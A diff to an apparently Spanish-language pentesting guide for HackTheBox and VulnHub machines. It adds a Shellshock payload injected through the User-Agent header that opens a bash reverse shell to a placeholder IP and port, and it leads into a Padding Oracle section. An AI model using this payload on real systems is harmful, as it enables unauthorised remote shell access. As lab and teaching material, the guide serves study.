@@ -1815,6 +1815,12 @@ Si todo sale bien y es vulnerable a la explotación de dicha vulnerabilidad, deb
 
 **Advertencia**: En caso de que **/bin/bash** no funcione, se recomienda probar alternativas, pues hay ocasiones en las que la ruta absoluta del binario no es la que hemos especificado, por lo que se requerirá de una ligera enumeración manual o un simple modo alternativo de conexión
 
+Otra opción es desde Burpsuite también, manipulamos el User-Agent para que figure el siguiente contenido:
+
+```bash
+User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/ip/puerto 0>&1
+```
+
 #### Padding Oracle Attack
 
 Esta vulnerabilidad la he llegado a probar en 2 entornos. Uno de ellos es en la máquina **Padding Oracle** de _VulnHub_ y otra de ellas es la máquina **Lazy** de _HackTheBox_. Ambas máquinas se resuelven de la misma forma en cuanto a explotación de vulnerabilidad respecta, pudiendo tomar 2 vías de explotación.
